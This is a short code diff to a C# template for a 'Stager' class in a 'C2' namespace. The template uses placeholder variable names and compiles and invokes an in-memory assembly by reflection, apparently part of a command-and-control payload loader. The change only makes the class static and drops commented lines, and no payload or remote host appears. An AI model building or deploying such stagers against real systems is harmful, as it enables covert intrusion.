@@ -13,7 +13,7 @@ $IMPORTS$
 
 namespace C2
 {
-    class Stager 
+    static class Stager 
     {
 		static void Main() 
         {
@@ -37,9 +37,7 @@ $ASSEMBLIES$
 			Assembly $variable_3$ = $variable_2$.CompiledAssembly;
 			Type $variable_4$ = $variable_3$.GetType("Example.HelloWorld");
 			
-			//string[] p = new string[0];
 			MethodInfo $variable_5$ = $variable_4$.GetMethod("FakeMain");
-			//Console.WriteLine(p.Length);
 			$variable_5$.Invoke(null, null);
 		
 	}
